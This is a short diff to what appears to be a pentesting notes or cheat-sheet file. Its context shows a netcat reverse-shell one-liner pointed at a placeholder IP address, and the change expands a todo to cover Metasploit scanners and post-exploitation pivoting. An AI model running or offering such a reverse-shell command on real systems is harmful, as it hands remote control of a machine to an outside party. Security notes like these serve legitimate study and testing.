@@ -14,4 +14,4 @@ use netcat to spawn a reverse shell:
 
 ``nc -e /bin/sh SOME-IP-ADDRESS 80``
 
-todo: add metasploit/bash automated scanners
+todo: add metasploit/bash automated scanner, pivoting examples(post exploitation)
